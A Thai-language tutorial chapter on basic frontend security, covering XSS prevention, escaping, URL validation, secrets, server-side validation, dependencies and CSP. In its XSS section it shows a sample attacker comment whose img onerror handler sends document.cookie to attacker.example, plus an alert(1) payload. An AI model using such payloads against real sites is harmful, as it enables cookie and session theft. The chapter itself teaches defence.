# Security พื้นฐานสำหรับ Frontend

> โค้ดฝั่งหน้าเว็บทำงานในเครื่องของผู้ใช้ ซึ่งเราควบคุมไม่ได้ และทุกคนเปิดดูได้ ความปลอดภัยของ frontend จึงเริ่มจากการยอมรับสองข้อนี้ บทนี้รวมช่องโหว่ที่เจอบ่อยที่สุดและวิธีป้องกันที่ทำได้ทันที

## บทนี้จะได้อะไร

- ป้องกัน XSS ช่องโหว่อันดับหนึ่งของหน้าเว็บ
- รู้ว่าทำไมไม่มี "ความลับ" ในโค้ด frontend
- ตรวจข้อมูลให้ถูกฝั่ง และดูแล dependency ที่ติดตั้ง
- รู้จัก Content Security Policy ตาข่ายชั้นสุดท้าย

## XSS: เมื่อข้อความกลายเป็นโค้ด

Cross-Site Scripting เกิดเมื่อข้อมูลที่ผู้ใช้ส่งมา ถูกนำไปแสดงเป็น HTML แล้วเบราว์เซอร์ของผู้ใช้คนอื่นรันโค้ดที่ซ่อนอยู่ในนั้น ผู้โจมตีจะทำทุกอย่างได้เท่าที่ผู้ใช้คนนั้นทำได้ ทั้งอ่านข้อมูลบนหน้า และส่งคำขอในนามเขา

ตัวอย่างคอมเมนต์ที่ผู้โจมตีส่งมา

```html
<img src="x" onerror="fetch('https://attacker.example/steal?data=' + document.cookie)">
```

```js
const comment = { text: '<img src="x" onerror="alert(1)">' };
const commentBox = document.querySelector('#comments');

// อันตราย: ข้อความจากผู้ใช้ถูกแปลความเป็น HTML แล้วรัน onerror
commentBox.innerHTML = `<p>${comment.text}</p>`;

// ปลอดภัย: สร้าง element แล้วใส่ข้อความด้วย textContent
const paragraph = document.createElement('p');
paragraph.textContent = comment.text;
commentBox.replaceChildren(paragraph);
```

ถ้าจำเป็นต้องประกอบ HTML เป็นข้อความ (เช่น template ยาว) ให้ escape ข้อมูลทุกชิ้นที่ไม่ได้มาจากโค้ดของเราเอง

```js
const ESCAPES = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (char) => ESCAPES[char]);
}

console.log(escapeHtml('<b>"สวัสดี"</b>')); // → &lt;b&gt;&quot;สวัสดี&quot;&lt;/b&gt;
```

เว็บ The Brain ใช้ฟังก์ชันแบบเดียวกันนี้กับทุกข้อความที่มาจากไฟล์บทเรียน (`the-brain-hub/assets/js/utils/escape-html.js`)

จุดอื่นที่แปลความข้อความเป็นโค้ดได้เช่นกัน: `outerHTML`, `insertAdjacentHTML`, `document.write`, attribute ที่ขึ้นต้นด้วย `on` และ URL ที่ขึ้นต้นด้วย `javascript:` ลิงก์ที่มาจากผู้ใช้จึงต้องตรวจก่อนใช้

```js
function safeUrl(input) {
  const url = new URL(input, 'https://example.com');
  return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? url.href : '#';
}

console.log(safeUrl('https://loxbit.com/docs')); // → https://loxbit.com/docs
console.log(safeUrl('javascript:alert(1)')); // → #
```

## ไม่ใช้ eval และพวกพ้อง

`eval(text)`, `new Function(text)` และ `setTimeout('โค้ดเป็น string', 100)` รันข้อความเป็นโค้ด ถ้าข้อความนั้นมีส่วนที่มาจากผู้ใช้แม้แต่นิดเดียว คือการเปิดประตูให้รันโค้ดอะไรก็ได้ แทบทุกงานมีวิธีที่ไม่ต้องใช้ เช่น อ่านข้อมูลด้วย `JSON.parse` และเลือกฟังก์ชันด้วยตารางค้นหา

## ไม่มีความลับในโค้ด frontend

ทุกไฟล์ที่ส่งไปถึงเบราว์เซอร์ ผู้ใช้เปิดอ่านได้ทั้งหมดจาก DevTools ค่าที่ใส่ผ่าน environment variable ของเครื่องมือ build ก็ถูกฝังลงไฟล์ JavaScript ตอน build อยู่ดี

| ใส่ใน frontend ได้ | ห้ามใส่ใน frontend |
|---|---|
| public key ที่ผู้ให้บริการออกแบบมาให้เปิดเผย และจำกัดโดเมนไว้แล้ว | secret key ของบริการชำระเงิน อีเมล หรือ AI |
| URL ของ API ของเราเอง | รหัสผ่านฐานข้อมูล |
| ค่าตั้งค่าที่ไม่ลับ | token ของบัญชีผู้ดูแลระบบ |

บริการที่ต้องใช้ secret ให้เรียกผ่าน backend ของเรา แล้วให้ frontend เรียก backend อีกทอด backend ยังตรวจสิทธิ์และจำกัดการใช้งานได้ด้วย

## ตรวจข้อมูลทั้งสองฝั่ง แต่เชื่อฝั่ง server

การตรวจในหน้าเว็บ (เช่น `required`, `type="email"`) มีไว้เพื่อ **ประสบการณ์ของผู้ใช้** ให้รู้ข้อผิดพลาดทันที แต่ข้ามได้ง่ายมากด้วยการเรียก API ตรง ๆ การตรวจที่ใช้กันความเสียหายจริงต้องอยู่ที่ server เสมอ ทั้งชนิดข้อมูล ความยาว สิทธิ์ของผู้ใช้ และราคาสินค้า อย่ารับราคาจากฝั่งหน้าเว็บมาคิดเงินเด็ดขาด

## ลิงก์ไปเว็บภายนอก

```html
<a href="https://example.com" target="_blank" rel="noopener noreferrer">เอกสารภายนอก</a>
```

`noopener` กันไม่ให้หน้าที่เปิดใหม่ควบคุมแท็บของเรากลับมาได้ เบราว์เซอร์รุ่นใหม่ใส่ให้อัตโนมัติแล้ว แต่ใส่ไว้ชัดเจนก็ไม่เสียหาย ส่วน `noreferrer` ไม่ส่ง URL ของหน้าเราไปให้ปลายทาง ป้องกันข้อมูลใน URL รั่วออกไป

## dependency คือโค้ดของคนอื่นที่รันในระบบเรา

ทุก package ที่ติดตั้งรันด้วยสิทธิ์เท่ากับโค้ดของเรา

```bash
npm audit
npm audit fix
npm ls package-name
```

- commit ไฟล์ `package-lock.json` ทุกครั้ง ให้ทุกเครื่องได้เวอร์ชันเดียวกัน
- ก่อนเพิ่ม package ใหม่ ดูว่ายังมีคนดูแล มีผู้ใช้จริง และจำเป็นจริงไหม ฟังก์ชันไม่กี่บรรทัดเขียนเองได้ปลอดภัยกว่า
- ระวังชื่อที่คล้าย package ดัง (typosquatting) เช่น สะกดสลับตัวอักษร

## Content Security Policy

CSP คือ header ที่ server ส่งมาบอกเบราว์เซอร์ว่าหน้านี้โหลดสคริปต์และทรัพยากรจากที่ไหนได้บ้าง ถ้ามี XSS หลุดมา สคริปต์ที่ถูกฝังแบบ inline หรือจากโดเมนแปลกจะถูกบล็อก

```text
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

ตั้งที่ web server (เช่น IIS หรือ Nginx) เริ่มจากโหมด `Content-Security-Policy-Report-Only` เพื่อดูว่าอะไรจะพังก่อนบังคับใช้จริง CSP ทำงานได้ดีที่สุดเมื่อโค้ดไม่มี script แบบ inline ซึ่งเป็นอีกเหตุผลที่ควรแยก JavaScript ไว้ในไฟล์เสมอ

## เช็กลิสต์ก่อนขึ้นระบบ

- ข้อความจากผู้ใช้ API และ URL เข้าหน้าเว็บผ่าน `textContent` หรือถูก escape ทุกจุด
- ไม่มี `eval`, `new Function` และไม่มี secret ในโค้ดหรือใน repository
- session ใช้ cookie แบบ `HttpOnly`, `Secure`, `SameSite` ไม่เก็บ token ใน `localStorage` ([บทเก็บข้อมูลในเบราว์เซอร์](18-web-storage.md))
- server ตรวจข้อมูลและสิทธิ์ทุกคำขอ
- `npm audit` ไม่มีช่องโหว่ระดับ high หรือ critical ค้างอยู่
- ตั้ง CSP และบังคับใช้ HTTPS

## ข้อผิดพลาดที่พบบ่อย

- ใช้ `innerHTML` กับข้อมูลจาก API เพราะ "ข้อมูลมาจากระบบเราเอง" ทั้งที่ข้อมูลนั้นผู้ใช้เป็นคนกรอกมา
- ซ่อน API key ด้วยการเข้ารหัสแบบ base64 หรือแยกไฟล์ ซึ่งยังอ่านออกได้ทั้งหมด
- ตรวจสิทธิ์แค่การซ่อนปุ่มในหน้าเว็บ
- ติดตั้ง package ทุกตัวที่เจอในตัวอย่างบนอินเทอร์เน็ตโดยไม่ตรวจ

## สรุป

- XSS ป้องกันด้วย `textContent` การ escape และการตรวจ URL
- frontend ไม่มีความลับ secret อยู่ที่ backend เท่านั้น
- ตรวจข้อมูลฝั่งหน้าเว็บเพื่อผู้ใช้ ตรวจฝั่ง server เพื่อความปลอดภัย
- dependency และ CSP คือชั้นป้องกันที่ต้องดูแลต่อเนื่อง

## อ่านเพิ่ม

- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Web security](https://developer.mozilla.org/en-US/docs/Web/Security)
- [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [npm Docs: npm audit](https://docs.npmjs.com/cli/commands/npm-audit/)
